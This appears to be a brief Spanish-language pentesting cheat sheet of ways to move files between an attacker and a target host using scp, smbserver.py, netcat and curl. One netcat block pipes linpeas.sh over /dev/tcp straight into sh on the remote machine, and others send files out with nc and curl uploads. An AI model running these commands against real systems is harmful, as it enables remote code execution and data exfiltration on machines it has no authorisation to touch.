https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb

# SCP
Desde máquina remot a local
```
scp -r nico@192.168.1.81:/nico/homer.jpg homer.jpg
```

# SMB
Crear servidor smb
```
smbserver.py <nombre del directorio> <lugar del directorio>
---
smbserver.py lepra .
```

# NC
De local a remoto
```
# Máquina local
sudo nc -q 5 -lvnp 8888 < linpeas.sh
---
# Máquina remota
cat < /dev/tcp/192.168.0.5/8888 | sh
```
De remoto a local
```
# Máquina local
nc -lvnp 1337 > archivo.py
---
# Máquina remota
nc 192.168.1.23 1337 < archivo.py
```

# Curl 
```
curl --upload-file <archivo> http://192.168.1.93
```